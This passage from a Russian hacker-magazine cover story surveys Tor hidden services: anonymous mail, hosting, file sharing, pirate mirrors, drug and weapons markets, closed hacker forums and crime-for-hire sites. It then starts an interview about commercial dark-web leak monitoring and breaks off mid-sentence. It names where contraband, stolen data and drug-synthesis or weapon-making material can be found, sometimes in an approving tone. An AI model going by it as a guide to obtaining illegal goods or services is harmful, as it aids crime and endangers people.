ботоводы и прочие любители автоматизации всех мастей. Это накладывает
массу ограничений.
  Самый популярный почтовик, который работает через  Tor, называет-
ся Sigaint. Его логотип — око с тремя угрожающими кровавыми каплями под
ним. «Кровь из глаз» — это в данном случае очень точная метафора. Интер-
фейс прямиком из девяностых, вырвиглазная палитра, реклама, распиханная
тут и там, злая капча (ее нужно вводить и при логине, и при отправке письма),
ограничение на размер ящика — 50 Мбайт, проблемы с русской кодировкой
при отправке писем... Короче, user experience примерно уровня средневеко-
вых пыток.





                                                                           Sigaint во всей красе

Альтернативы Sigaint как бы существуют, но они либо платные (например,
Lenatos стоит 0,016 BTC за полгода, AnonInbox — 0,1 BTC в год), либо отправ-
ляют письма только на другие адреса в Tor. Ко второй группе относятся, к при-
меру, TorBox и Mail2Tor. Чтобы послание, отправленное с одного из них, было
доставлено на обычную почту в clearnet, придется использовать реле, а это от-
дельная головная боль.
   Существует целый класс серверов на основе опенсорсного OnionMail. Если
осилишь настройку, то сможешь подсоединиться к одному из них через обыч-
ный почтовик (через POP3 и SMTP). Подойдет, к примеру, Thunderbird с пла-
гином TorBirdy. Актуальный список серверов ищи в разделе Servers на сайте
OnionMail. Если используешь Linux (желательно Tails), то настройку поможет
облегчить скрипт onion.py.





                 Примерно так выглядит парадная сторона любого сайта на OnionMail


Хостинг

Ранний интернет отличался тем, что для желающих открыть свой сайт была
масса возможностей сделать это за копейки или вовсе бесплатно — в обмен
на баннер или хотя бы ссылку на хостера. В Onion ситуация иная: бесплатные
хостинги не прижились, да и платные выглядят не очень-то привлекательно.
   Причина этого проста: платить за хостинг, доступ к которому можно по-
лучить только через Tor, готовы в основном наркоторговцы и прочие бан-
диты. Если ты не замышляешь присоединиться к ним, то можешь без труда
развернуть сервер хоть у себя дома или же найти хостинг-провайдера, ко-
торый не будет возмущаться тем, что ты запустишь Tor на его сервере. Даже
для криминальной активности часто прибегают к услугам так называемых
bulletproof-хостеров, которые работают в том числе и с clearnet.





                                                                           Real Hosting

Но раз уж мы заговорили о хостинге в даркнете, то приведем пару примеров.
На Hidden Host обещают 20 Гбайт места и нелимитированный трафик за 0,1
BTC в год; Real Hosting стоит 0,25 BTC в год и дает всего 256 Мбайт места и 1
Тбайт трафика; Kowloon Hosting Services имеет гибкую тарификацию — от 0,04
BTC в месяц за 256 Мбайт до 0,8 BTC за полгода и 2 Гбайт.





                                                                      Kowloon

Кстати, у Kowloon (читается «Коулун» или «Цзюлун». Это, к слову, страшно пе-
ренаселенная часть Гонконга) есть бесплатный пробный тариф. Если написать
письмо с темой TRIAL  название_домена на специальную почту, то в ответ
придут данные, необходимые для доступа. Именно поэтому, видимо, при на-
шей импровизированной индексации дарквеба мы нашли около шести сотен
ссылок на пустые дефолтные страницы, хостящиеся у Kowloon.

Шейринг

Если с бесплатным хостингом в Onion туго, то местечек, где можно временно
захостить файл, картинку или кусок текста, предостаточно. Для файлов разме-
ром менее 500 Кбайт есть PopFiles, картинку можешь закинуть на сайт с не-
затейливым названием Image Hosting, текст — на Stronghold Paste, CrypTor,
ZeroBin или Pasta.





                                                                      Stronghold Paste

Любой из них позволяет задать таймер, по которому информация будет стер-
та. На Stronghold Paste есть раздел с архивами — можешь поинтересоваться,
какую ерунду туда постят. Чтобы твои данные не попали в этот список, не забы-
вай ставить галку Private. Заметь, что у Pasta ограничение на размер текста —
целых 10 Мбайт. При желании сюда вполне можно запостить файл, закодиро-
ванный в Base64.

Торренты

Что обычно прячется в темных уголках интернета, кроме наркоты и голых пи-
сек? Конечно же, варез! В наше время тут, правда, никакой особой веселухи:
есть зеркало The Pirate Bay, и оно в целом покрывает большую часть пиратских
потребностей. У RuTracker отдельного сервиса в Onion нет (Tor и так позволя-
ет заходить на RuTracker.org в обход блокировки), зато такой есть у Rutor. Еще
можешь заглянуть на «Схоронил» — этот сайт на порядок меньше (1,6 миллио-
на раздач против 25 миллионов у Rutor), но лишний шанс отыскать что-то ред-
кое не повредит.





                   Если thepiratebay.org перестал открываться, ты знаешь, что делать


Книги

Для книголюбов в дарквебе тоже есть все необходимое — в первую очередь
это «Флибуста» и отличный поисковик по «библиотеке Траума» под названием
«Словесный богатырь». Английские и немецкие книги можно поискать в ме-
стечке с пафосным названием Imperial Library of Trantor, но с новыми поступле-
ниями там туговато. Еще есть Calibre, правда база из 1600 книг — это как-то
не очень серьезно. В развалах компьютерной и учебной литературы на ан-
глийском можешь покопаться по этой ссылке. Ну и конечно, на место в заклад-
ках серьезно претендует зеркало пиратского агрегатора научных работ Sci-
Hub (мы о нем уже как-то раз писали).





                                                      Второй важный парусник


Общение

Ходить на хидденсервисы, просто чтобы потрепаться, — это, определенно,
развлечение на любителя. В обычном вебе достаточно ресурсов, на которых
можно анонимно зарегистрироваться (или не регистрироваться вовсе) и бол-
тать о чем душе угодно. На «луковых» сайтах говорят в основном о делах. Ка-
ких — ты уже, наверное, понял.
   Мест для свободного общения не так много, но они существуют. Еще не-
давно в Onion работало зеркало 2ch.hk — ссылку приводим на тот случай, если
оно еще оживет. Есть и другие имиджборды: знаменитый в узких кругах ино-
странный 8chan, русскоязычные Neboard и «Хайбане».





                                               Neboard. Черный чан в темной паутине

Главной социальной сетью Onion можно считать Galaxy2 — если покопаться,
то в ней можно найти занятные тематические группы или познакомиться с ин-
тересными людьми. Тем, кто предпочитает общаться на русском, будет не-
безынтересен ресурс onelon. Это довольно необычная платформа для блогов
с небольшим, но живым сообществом. Обрати внимание, что для регистрации
потребуется создать себе ключ PGP (это, кстати, распространенное в даркве-
бе явление).





                                  Galaxy2. Стоило зарегистрироваться — уже трое друзей

Может оказаться полезным и сайт Hidden Answers. Это что-то вроде Yahoo
Answers или «Ответов@Mail.Ru», но с фокусом на даркнете и связанных с ним
вещах. Главные темы — надежность торговых площадок, настройка Tor и, ко-
нечно, поиск тематических ресурсов. Последнее делает Hidden Answers инте-
ресным местом для начала серфинга.
   Как минимум для галочки стоит упомянуть, что в Onion работает зеркало
Facebook. Для живущих в России в нем смысла немного, но, к примеру, в Ки-
тае Facebook заблокирован, так что ходить на него через Tor — самое оно.
  Вообще говоря, значительная часть переписки в теневой стороне интер-
нета происходит не на сайтах, а в Jabber и IRC. Выбор пригодных клиентов,
настройка анонимного подключения и поиск серверов и групп — это тема
для отдельной статьи, так что здесь ограничимся лишь парой ссылок. TorXMPP,
Cyruserv, securejabber.me — серверы Jabber, расположенные в Onion; CgAn
IRC и  Volatile — клиенты IRC, способные работать прямо в Tor Browser;
ChatTor — примитивный, но удобный вебовый чат с возможностью создавать
свои комнаты.





Ну и если тебе вдруг станет совсем скучно и не с кем поговорить о погоде
и последних изысканиях в даркнете, то загляни на Chat with strangers — это
местный аналог Chatroulette.


                           Продолжение статьи
COVERSTORY
ЧТОЧТОНачало статьиДАЮТДАЮТ ВВ ДАРКВЕБЕДАРКВЕБЕ
ИЩЕМ ПОЛЕЗНОЕ
В СКРЫТЫХ
СЕРВИСАХ TOR





Магазины

Магазины и торговые площадки — это, похоже, пока что и есть основное при-
менение скрытых сервисов Tor. Поэтому остановимся на них чуть подробнее
и (исключительно в исследовательских целях) пройдемся по основным рын-
кам. Вообще, когда просматриваешь списки ссылок, от всех этих «акропо-
лей», «александрий», «оазисов», «гетто», «лавок», «лавочек», «магазинчиков»,
«аптек» и прочих закутков голова начинает идти кругом. Конкуренция огромна,
и каждый задрипанный наркоторговец пытается урвать свое, изгаляясь и при-
думывая, как выделиться. Как тебе название магазина «Мерцающий цирк воз-
мездия»? Нам тоже понравилось — чисто с литературной точки зрения.

AlphaBay





AlphaBay — один из крупнейших маркетов, которые разделили hidden-рынок
после закрытия знаменитого Silk Road. «Официально» считается, что сайт
«основан кардером под ником alpha02, известным участником большинства
кардерских форумов и известной личностью среди продвинутых кардеров».
Европейские исследователи уверяют, впрочем, что маркет работает под про-
текцией «российской мафии», поскольку серверы находятся в России и адми-
нистрируются с российских IP-адресов. (Хорошо бы, кстати, придумать «рус-
ской мафии» какое-то более броское название типа «якудза»!)
   Может, мафия и русская, но сайт полностью англоязычный. Регистра-
ция бесплатная, зато очень непростая — с парой десятков полей. Торгов-
ля, как и на подавляющем большинстве маркетов, идет за биткойны. Есть
escrow-сервис. Как отмечают покупатели, сайт оперативно модерируют, вычи-
щая спам и скам. Впрочем, судя по некоторым разделам, забитым рекламой
и предложениями интимных услуг, этого все же недостаточно.
  Самое крупное преимущество AlphaBay — это, конечно же, ассорти-
мент. Маркет содержит 147 тысяч предложений в разделе Drugs & Chemicals
(предлагающем, ожидаемо, наркотики и запрещенные лекарства), 27 ты-
сяч — в разделе Fraud (здесь продаются дампы баз и персональные данные)
и 13 тысяч — в разделе Digital Products (доступы к аккаунтам, игровые ключи
и разнообразный софт). По нескольку тысяч позиций содержат и остальные
разделы: оружие, драгоценности, кардинг, малварь, хостинг и прочие услу-
ги. Неожиданно интересен раздел Guides & Tutorials, в котором выставляется
на продажу самая разнообразная информация: от безобидных каталогов сай-
тов или гайдов по «взлому Wi-Fi» до готовых ботнетов, включающих списки уже
существующих ботов, инструкции по использованию и софт для управления.

Dream Market





Маркет, близкий по функциональности, качеству и наполнению к AlphaBay.
Специализируется на наркотиках и цифровых продуктах. Позиций на порядок
меньше, но в целом спектр товаров тот же. Маркет ничем не примечателен,
кроме разве что интригующего вопроса: зачем им кто-то пользуется, если
есть маркеты лучше?
  Мы решили показать тебе этот сайт по одной причине: прочие англоязыч-
ные магазины имеют еще более скудный ассортимент. Другими словами, если
AlphaBay — «лучший из лучших», то Dream Market — «худший из лучших», свое-
го рода «первая ступень» качества типичного hidden-маркета.

Hydra





Hail Hydra! А, стоп, речь же не об этом. Гидра называет себя «анонимной тор-
говой площадкой», но по сути это соцсеть для наркоторговцев. Специализиру-
ется исключительно на наркоте (амфетамин и его соли, кокаин и производные,
обмен закладками). Владельцы при этом не стесняются рекламироваться даже
в открытом интернете: сайт hydra.ooo (http://hydra.ooo/) находится на первых
страницах выдачи Google, что странно. Детские опечатки и легкомысленные
смайлики тоже доверия не прибавляют.
   Сайт русскоязычный, а судя по комментариям в коде и используемым при-
ложениям — изначально русский. Регистрация минималистичная (логин и па-
роль) безо всяких подтверждений. Имеется чат. Спам не чистится: админы
не считают спамерами тех, кто заплатил деньги за размещение, о чем сооб-
щают на первой же странице. Кроме разделов по продаже, найму и обсужде-
нию продавцов в разных регионах и странах, имеет три интересных раздела:
«FAQУЛЬТЕТ» (в темах которого раскрываются детали и секреты теневого нар-
кобизнеса), «HYPERLAB» (рецепты и способы синтеза наркоты) и «РАБОТА»
(палящий скрытую взаимосвязь некоторых на вид легальных профессий с ми-
ром наркоторговли).

T*chka





Очередной наркомаркет, но в отличие от остальных — с идеологией. «Точка»
(как видно из названия, создатель — русский) была создана полтора года на-
зад и позиционировала себя как первый наркомаркет, контролирующий чест-
ность и безопасность сделки: до «Точки» в англоязычном Onion понятие «за-
кладка» (dead drop, drop-off) не получало широкого распространения. Админ
сайта признался, что пытается вложить в маркет «honesty, security and tolerance
in every way»: это можно заметить уже при регистрации, в предупреждении
о запрете на распространение некачественных и непроверенных наркотиков,
оружия, ядов, порно, экстремистских материалов и дискриминации на почве
расы, политики или религии.
   Интерфейс можно выбрать русскоязычный, однако описание всех предложе-
ний — на английском. Как видно на скрине, предложений на три порядка меньше,
чем на AlphaBay, но при этом акцент ставится на «чистоте» и «качестве» товара.
Товар, кстати, не всегда наркота — продаются на маркете и редкие и дорогие
лекарства, которые в ряде стран невозможно достать легальным способом, до-
кументы и программы для фальсификации, некоторые хакерские услуги.

Форумы

RAMP





Очередной русскоязычный полуфорум-полумаркет для наркобарыг. Общение
отсутствует, обсуждение взлома, безопасности, криптографии, сливов, мал-
вари, кардинга и так далее запрещается уже при регистрации, во время ко-
торой ты обязан две минуты пыриться в этот список запретов. Вся активность
на сайте сводится к торговле наркотой.

The Hub





Унылый англоязычный форум про все, что не разрешено в белых пушистых
интернетах. Подавляющее большинство комментариев — в разделах For
Beginners, Darknet In General и Off Topic, что как бы намекает на качество аудито-
рии и обсуждений. Без JavaScript не работает. Раздел Vendors содержит унылые
попытки самопиара огромного количества каких-то наркобарыг и натянутые од-
нообразные обзоры различных наркомаркетов. Боже, как же это утомляет.

Закрытые хакерские форумы и сайты

Хакерские темы можно найти тут и там, но специализированные форумы
по большей части не отличаются дружелюбностью, и даже свободная реги-
страция — редкость. К примеру, вход на Hell, один из наиболее известных фо-
румов, стоит 0,1 BTC (порядка 60 долларов).





                                                                                             Hell

GroundZero, SiphON и BlackHat на первый взгляд выглядят открытыми, но подо-
зрительно пустыми. Можно не сомневаться, что все самое интересное спря-
тано в разделах, которые не видны простому посетителю.





                                 На GroundZero три жалких публичных раздела

При регистрации на большинстве таких форумов предлагают ввести код при-
глашения, и, даже если ты им владеешь, не факт, что тебе будут сразу же от-
крыты все ветки. Немало публичных разделов есть на форуме 0day, но можешь
не сомневаться — и тут тоже основная движуха происходит в разделах, куда
с улицы не попадешь.





                                                                              0day

В открытом доступе остается совсем немного. Самый популярный топик — это
кардинг: заливы, CVV, обналичка для различных платежных систем, способы об-
хода антифрода, обсуждения того, где брать дампы. В общем, боевым кроберам
с «Кардер Плэнет» здесь будет скучновато, но если просто интересует тема, что-
то новое ты точно узнаешь: почитай FAQ и покликай по ссылкам для новичков, ко-
торыми щедро делится сообщество.
   Что касается остальных разделов в паблике, то тут сплошное огорчение: шанс
найти 0day в целом ниже, чем в clearnet. Зато можешь заглянуть в раздел Accounts
and Database Dumps, иногда встречаются знакомые слова вроде VK или Rambler.
   Конечно же, персональные сайты в дарквебе есть и у хакерских групп. В ка-
честве примера можешь  глянуть  CyberGuerrilla, The Hack  Lair, Hacker4Hire
и Hackmasters, но, признаться честно, ловить там особо нечего. Выделяется раз-
ве что биржа «Анонимного интернационала», где можно принять участие в торгах,
на которых разыгрывают содержимое аккаунтов российских чиновников.



                           Продолжение статьи
COVERSTORY
ЧТОЧТОНачало статьиДАЮТДАЮТ ВВ ДАРКВЕБЕДАРКВЕБЕ
ИЩЕМ ПОЛЕЗНОЕ
В СКРЫТЫХ
СЕРВИСАХ TOR





Оружие, шпионаж, спецоперации

Runion





Russian Onion Union — наиболее популярный и познавательный русскоязыч-
ный форум дарквеба, специализирующийся на защите и самозащите. В раз-
деле «Оружие» можно найти основные понятия и FAQ по оружию, инструкции
и книги по изготовлению самодельных средств защиты, расчеты мощности
взрывчатых веществ, обсуждение военной техники, оружия и боеприпасов,
уроки по самообороне и диверсиям, а также предупреждения знающих людей
об оружейных веб-форумах, торгующих информацией о своих посетителях.
  В разделе «Техника безопасности» обсуждаются методы прослушки, слеж-
ки, обнаружения и защиты от них, типичные ошибки начинающих анонимусов
и громкие ошибки известных террористов. Есть FAQ, правила и советы по без-
опасному поведению в различных странах мира, а также способы обхода
официальных запретов, сокрытия потенциальных улик и «заметания следов».
Инструкция под названием «Санитарный день», перечисляющая способы под-
держания личной информационной чистоты, будет полезна любому посетите-
лю, даже если он зашел на форум с самыми невинными намерениями.
   Раздел «Защита информации» расскажет тебе о методах шифрования
и скрытия трафика, безопасных сервисах и утилитах, а также о способах по-
вышения  абузоустойчивости некоторых популярных программ, девайсов
и веб-серверов. Тема под названием «Tails: FAQ», объясняющая, что такое The
Amnesic Incognito Live System, будет отличным стартом для совершающего
свои первые шаги анонимуса.

Raegdan’s Fukken Saved





Русскоязычный архив, содержащий полные и частичные дампы некоторых «по-
чищенных» в свое время clearnet-сайтов. Для любителей оружия тут есть не-
мало интересного.
1. Дамп оружейного форума steelrats.org, хранящий контент на конец 2012 года.
  Форум содержит некоторое количество материалов по кустарному констру-
   ированию вооружения, спецсредств и разведывательной техники. Можешь
   сравнить с Runion и оценить, как жалко в то время выглядел анонимус.
2. Чертежи, фотосеты и видеоинструкции по 3D-печати самодельного оружия,
   сохраненные с не существующего уже сайта американца Джеймса Патрика.
   Оружие, правда, годится только для самозащиты, потому как пластиковое.
3. Руководства юного повстанца по сколачиванию собственной вооруженной
   банды: «Азбука домашнего терроризма», «Партизанская война» и «Учебник
   городского партизана». Разумеется, после чтения этих книг никакого «го-
   родского партизана» из тебя не получится (партизаны вообще книги не осо-
   бо читают), но это может помочь лучше понимать психологию бандитов
   и уклониться от контактов с ними, если возникнут массовые беспорядки.

Cryptostorm





Tor-версия форума одноименного VPN-провайдера Cryptostorm, располо-
женного в Исландии. Довольно познавательный англоязычный ресурс, содер-
жащий обсуждения по защите и шифрованию информации о личной жизни
и перемещениях. В основном, разумеется, содержит разделы, посвященные
работе VPN Cryptostorm и развитию их утилиты для «абсолютной защиты»
Cryptostorm Widget. Раздел Stormphone содержит небольшую, но ценную ин-
формацию и обсуждения по теме защиты данных на мобильных устройствах.

Black Market





Магазин, позиционирующий себя как «Номер один в сети Tor» и ведущий себя
практически как легальный. Владельцы утверждают, что предоставляют гаран-
тию качества во всех странах мира, оружие проверено и может быть заменено
в случае его отказа (в течение одной недели), в цены уже включена доставка,
а при доставке прикладываются десять бесплатных патронов. Одним словом,
эпичный и весьма красивый развод, впечатление от которого не портит даже
указанный в списке товаров золотой Desert Eagle. Действительно, вдруг кто-то
хочет анонимно и скрытно купить пистолет, чтобы хвастаться им перед друзья-
ми. Почему бы и нет.

Black Market Guns





В противовес предыдущему — настоящий магазин оружия, расположенный
в США и легально торгующий разрешенным в США оружием, деталями, запча-
стями и боеприпасами. Содержит 26 позиций, среди которых есть даже пара
приборов ночного видения. Владельцы молчаливо обходят все вопросы лега-
лизации покупки на стороне покупателя, предлагая лишь доставку с помощью
FedEx. Пристрелянный товар и инструкции по сборке в комплекте. Официаль-
ный email на tutanota.com также заставляет поверить в серьезность предложе-
ния. Но мы, конечно, не проверяли.

No Background Check Gun Store





Магазин неизвестного происхождения (подозреваем, владельцы — из США,
но подтверждения нигде нет), позиционирующий себя как «самый большой
каталог оружия в Deep Web». Количество позиций действительно впечатляет:
владельцы предлагают на выбор 570 пистолетов, 230 винтовок и 30 помповых
ружей. Выбор настолько велик, что присутствует поиск по каталогу. Смущают
только три факта: круглое количество позиций в разделах, почта на gmail.com
и наиболее знаменитые производители в каждой из категорий. Слишком кра-
сиво, чтобы быть правдой.

Euro Guns и UK Guns





Два магазина одного владельца, работающие, соответственно, с территории
Европы (предположительно Нидерландов) и Великобритании. Владелец за-
ботливо предлагает покупателям регистрацию (зачем?), реферальную про-
грамму с отчислением в 1% (а, так вот зачем), несколько способов покупки
биткойнов за наличные и бесплатную доставку. Ассортимент при этом неболь-
шой и абсолютно одинаковый, что и заставляет предположить наличие обще-
го владельца (а скорее всего, вообще одного человека, который не находится
ни в Великобритании, ни в Европе). Если ты что-то тут успешно приобретешь
(что очень маловероятно), не забудь отчислить нам 1% за наводку!

MaskRabbit





Веселый сайт, позиционирующий себя как «анонимное агентство для выпол-
нения операций в реальном мире». Специализируется на доставке, воровстве,
шпионаже, саботаже, бандитизме и взломах. При этом сразу же и веселит
тем фактом, что заявляет о работе «только с профессиональными агентами»,
одновременно предлагая отправить заявку на вступление в ряды этих самых
«агентов». Отдохни, 47-й, тебе найдена достойная замена — видишь, пришло
письмо от Васи из Воронежа!

C’thulhu





Еще более веселый сайт, одно название которого уже говорит о высоком про-
фессиональном уровне его создателей. Намерения «организованной крими-
нальной группировки C’thulhu» настолько серьезны, что им приходится объ-
яснять, почему ты должен нанять именно их и именно через Tor. На резонный
вопрос «Где пруфы, Билли? Нам нужны пруфы!» разработчики веско отвечают:
мы удаляем все пруфы после выполнения заказа (для вашей же безопасно-
сти), а у наших заказчиков совершенно нет времени сидеть на форумах и от-
вечать на какие-либо письма. Nuff said.
   Впрочем, градус веселья несколько снижает наличие публичного PGP-клю-
ча, email на bitmessage.ch и подробный прайс. Возможно, за нарочито неле-
пым, «отводящим глаза» фасадом все же скрывается серьезный бизнес.

Besa Mafia





Совсем не смешной сайт действующей албанской мафиозной группировки.
Открывай, только убедившись в отсутствии рядом детей.
   Besa Mafia действует на территории США, Канады, Европы и многих других
стран, предлагая такие жестокие услуги, как выбивание долгов (с членовре-
дительством), убийство для устрашения (впрочем, скрытное устранение тоже),
поджигание автомобилей и домов, а также продажу незарегистрированного
оружия. В разделах сайта можно найти инструкции по сохранению анонимно-
сти при заказе, пошаговое описание безопасного процесса оплаты заказа,
прайс-лист, FAQ и даже дисклеймер, в котором заявляется, что услуги Besa
Mafia предоставляются исключительно в целях защиты клиента от нависшей
над ним угрозы. Чтобы сделать заказ, нужно указать контакт человека, кото-
рый уже состоит в группировке, иначе ты сам можешь стать следующей целью.
Создатели сайта также заявляют, что не являются исполнителями: они посред-
ники и получают за это 20% от суммы. Исполнитель получает 80%.
   Ну как, поверил? Достаточно убедительно? А теперь правда: этот сайт —
полицейский скам. Администраторы Besa Mafia сливают переписку с «заказчи-
ками» и контакты «исполнителей» в правоохранительные органы разных стран.
Если ты параноик, ты мог это заподозрить еще в момент просмотра раздела
«Видео»: выложенные там ролики — простая нарезка из американских ново-
стей, которая подтягивается с YouTube и не работает без JavaScript. Впрочем,
после слива Silk Road подобным скамом является большинство сайтов в Tor.

Прочие полезности

• Dead Drop — сервис для передачи шифрованных сообщений. Для реги-
  страции нужен ключ PGP, он же поможет оставить послание без адреса-
   та. Желающие прочесть его смогут для этого ввести твой публичный ключ,
  и сервис выдаст текст.
• Deep Web Radio. Учитывая, что напрягов с музыкой в «чистом вебе» осо-
  бо нет, существование подпольной радиостанции обосновать непросто.
  Но тем не менее она существует. Можешь слушать один из пяти «эфиров»
  и тащиться от того, что делаешь это через Tor.
•
•
•
•
•
•
•
•
•
•
•
•
•
•
•                                                          Радио из глубин
•
• Bitcoin Block Explorer, зеркало Blockchain.info — сайта, который помогает
   отслеживать транзакции Bitcoin.
• Keybase — зеркало Keybase.io. Он позволяет связать свои публичные клю-
   чи PGP с пользовательским профилем. Зарегистрироваться не помешает,
  но помни, что Keybase славится длинной виртуальной очередью, которую
  нужно отстоять, прежде чем пришлют приглашение.
• Cryptome — зеркало легендарного сайта о приватности и криптографии
   Cryptome.org. Последний раз синхронизировано в 2013 году, но пока ос-
  новной сайт никуда не девался, смысл вместо него пользоваться скрытым
  сервисом под сомнением.

Итого

Конечно, взять и обозреть весь дарквеб невозможно. В первую очередь по-
тому, что две тысячи ссылок — это все же две тысячи ссылок и пройти их все
нелегко (да и не нужно). Общую идею ты наверняка уловил, и, надеемся, на во-
просы «что посмотреть?» и «откуда начать?» мы ответили.
   Второй, еще более важный момент — «дарк» в слове «даркнет» все же подра-
зумевает, что сайты скрыты от посторонних и пробраться на них с наскока невоз-
можно. Никакое индексирование не спасет, и тут нужен индивидуальный подход.
  В целом открытая часть дарквеба настолько напоминает интернет девяно-
стых годов с его характерным антидизайном и общей безалаберностью, что
прямо накатывает ностальгия. Главные отличия: сайтов в Onion сильно мень-
ше и они значительно криминальнее. Зато здесь можно, словно в старые до-
брые времена, заниматься сетевым серфингом и чувствовать, как со всех сто-
рон обдувает ветер свободы!
COVERSTORY
LEAKREPORTER                        КАК МОНИТОРЯТ
                       ДАРКНЕТ





                                                                           Беседовал
                                                                  Андрей
                                                              Письменный





Каждый босс хотел бы заранее знать, что злоумышленни-
ки, скрывающиеся в даркнете, замышляют похакать ком-
пьютеры его фирмы. Как ни странно, это возможно! Бла-
годаря непрестанному мониторингу дипнета и внедрению
на закрытые форумы спецы из компании Leakreporter обо
многом узнают заранее. Как именно это работает, нам
рассказал сотрудник Leakreporter, попросивший не назы-
вать его имя.


Проект начинался как альтруистический и некоммерческий: я хотел
оповещать пользователей о том, что их хакнули. Сделано это было кри-
во-косо — в виде рассылки на почту. Если оказывалась вскрыта почта, то мы от-
правляли на нее письмо: «Срочно смените пароль!» Потом на нас вышли круп-
ные email-провайдеры и посоветовали монетизироваться.

Списки утекших аккаунтов попадали к нам, когда мы лазали по фору-
мам и скачивали дампы. Утекает дикое количество информации, и иногда
она попадает ко мне. Мне стало жалко людей, у которых угоняют кучу аккаунтов
через эти почты. Надо было попытаться хоть что-то с этим сделать. Замутили
в итоге такую рассылочку.

В чем-то это похоже на сайт Have I been pwned. Но там сервис основан
на том, что пользователь должен сам зайти, вбить свой email, и тогда ему уже
скажут, утекло ли что-нибудь. Как правило, там информация появляется с за-
позданием. Если пользователю не пришло никакое оповещение о том, что его
взломали, то его аккаунт «отработают» очень быстро.

К Leakedsource я отношусь значительно хуже, чем к Have I been pwned.
Его владельцы стимулируют работать фрод-движение. Раньше дампы прода-
вались, но особенно никому не были нужны. Люди их копили годами, как тот
же Twitter. Кстати, та база, которую на Leakedsource выдают за дамп аккаунтов
Twitter, — это на самом деле логи с Malware и из всяких списков паролей. То
есть куча аккаунтов собрана из разных источников. Фрод-движение подхвати-
ло эту тему, так как все поняли, что можно собрать побольше такого материала
и продать его Leakedsource. Активизировались все: спамеры, фишеры, — все
захотели урвать кусок пирога и начали активно действовать. Поэтому никогда
нельзя платить теневым ребятам.

Помимо меня, в команде Leakreporter есть второй кодер, переводчик
(мы много работаем с зарубежными комьюнити, и его услуги нужны)
и наш инвестор, тоже безопасник.

Команда постоянно отслеживает фрод-комьюнити, мониторит сайты,
собирает новости, а также всю информацию, которая стекается на ло-
вушки. Реализуются они по-разному — как правило, таргетированы и призваны
показать, сколько людей заинтересованы чем-то связанным с конкретной ор-
ганизацией. Секреты раскрывать не могу, но если обобщить, то ловушка — это
место, куда стекается информация от фродеров, и они сами об этом не знают.

Сам я с заказчиками не разговариваю, для меня это большой стресс!
С ними общается мой коллега.

Мы предлагаем разные услуги — тут все зависит от запросов и сферы
деятельности компании. Первое, что мы можем сделать, — это обезопасить
сотрудников. Второе — обезопасить от внутренних утечек. У нас достаточно
информации для этого. Третье — мы можем помочь залатать неочевидные ды-
рки, через которые тоже может утечь информация.

Бывает, что неявные угрозы сильно портят жизнь компаниям, и пен-
тестеры на такие вещи обычно не обращают внимания. Самая большая
уязвимость, как сейчас говорят, — это человек. Если не влез в систему, то мо-
жешь влезть в голову сотрудника. В даркнете сейчас стало много обсуждений
социальной инженерии, социальные инженеры чуть ли не резюме стали выкла-
дывать. Вот именно такие каналы мы и помогаем прикрыть. Ну и если инцидент
уже произошел и клиент пришел после этого, то мы помогаем найти того, кто
стоит за инцидентом.

Среди наших клиентов — крупные банки, а также компании, связанные
с ИТ и ИБ. У нас есть информация, которая может очень помочь в предотвра-
щении фрода. Мы можем провести расследование в том случае, если что-то
уже утекло. А если еще нет, то можем предупредить о возможной утечке и о том,
что над ней уже работают хакеры.

Для тех заказчиков, у которых стоят автоматизированные системы
защиты от фрода, у нас есть API — онлайновый фид, который постоянно
пополняется несчетное количество раз за день. И постоянно сопоставляется
с условиями клиента.

Вот пара примеров того, как выглядят данные в этом фиде. Это тене-
вой прокси и C&C ботнета.





А вот как выглядит лента по засветившимся пользовательским данным:





О той же утечке Dropbox я уведомил почтовых провайдеров еще в июне
2016 года, тогда как публика узнала о сливе в конце августа. Я разослал
провайдерам адреса задолго до того, как начался shitstorm, как это называется
у пиарщиков, и они к тому времени успели все поблочить. Это показательно —
в привате информация появляется сильно раньше, чем на маркетах. То же са-
мое, кстати, было и с Last.fm.

Базы учеток Dropbox не продавали, их просто раздавали избранным.
Мне попался кусочек, и я разослал информацию всем, кто мог пострадать. По-
том мне обновили базу — я тогда смог договориться с человеком. Вообще,
договариваться, не платя денег, очень тяжело.

Мы не платим за базы, потому что любая оплата теневому комьюнити
поощряет его работу. Это как финансирование терроризма. И речь вовсе
не о возможных проблемах с законом, а о чисто этической стороне.

Уверенными в том, что охватили всё, мы быть, конечно, не можем. По-
жалуй, даже АНБ не охватывает всего. У меня в работе в районе 3000 ре-
сурсов и около 5000 различных конференций. Отслеживать базу по всем ор-
ганизациям и угрозам — это нереально. Но таргетированно можно охватить
95–98%. Мониторинг сайтов и сбор логов конференций автоматизированы,
мы потом проводим анализ.

В русском сегменте закрытых ресурсов довольно мало. По всему миру
из 3000 закрыто где-то 40–50%. Конференции — это в основном IRC и Jabber,
но точно так же это может быть Telegram или, скажем, Skype. Где только народ
не тусуется.

В даркнете вполне реально купить утекшие данные — даже если ты при-
шел со стороны и не знаешь, куда ткнуться, кроме каталогов ссылок. Для та-
кой информации, которая лежит в паблике, порог вхождения невелик. Можно,
к примеру, посмотреть на разрекламированный магазин The Real Deal. Там
продавали в том числе базу LinkedIn.

Есть и маркеты, на которые просто так не зайти. Мы постоянно занима-
емся проникновением на закрытые форумы.

Самым ярким примером будет реинкарнация Dark0de. Ты наверняка пом-
нишь такой ресурс. Его перезапустили, но, чтобы войти на него, я потратил жут-
кое количество времени. Нужны рекомендации от пяти человек, и это довольно
жесткое условие. Да и вообще на большинстве ресурсов в даркнете требуются
рекомендации. Нужно, чтобы за тебя поручились от одного до пяти человек. Я
даже видел ресурсы, где надо десять рекомендаций. Это, конечно, жестоко.

Помимо полностью скрытых ресурсов, есть и открытые, но с подполь-
ным разделом для своих. К примеру, есть форум Exploit, на нем организова-
ны зоны доступа — первый левел, второй, раньше был третий, но его расфор-
мировали. То есть зайти-то на ресурс ты можешь просто так, но, чтобы попасть
в разделы, где действительно качественная инфа, тебе надо набирать реко-
мендации и вести активную жизнь на форуме. Процесс очень сложный.

Чтобы попасть в такое место, нужно показать, что ты чего-то стоишь,
что твой скилл понадобится в этом подполье.

Многие пытаются попасть на форумы, чтобы просто поглазеть, — такие
отсеиваются довольно быстро. Потому что дипнет — это то место, в кото-
рое заходят не просто из любопытства, туда заходят с четкой целью, как пра-
вило с целью что-нибудь анонимно купить. Добыть нужную информацию можно
и в клирнете, главное — знать, где искать (в тех же приватных разделах фо-
румов). А купить тут можно все — начиная со сканов документов и заканчивая
наркотиками, базами данных и оружием.

Маркетов в даркнете очень много, конкретно хакерам будут интересны
маркеты типа The Real Deal. Но вообще количество рынков с начала года со-
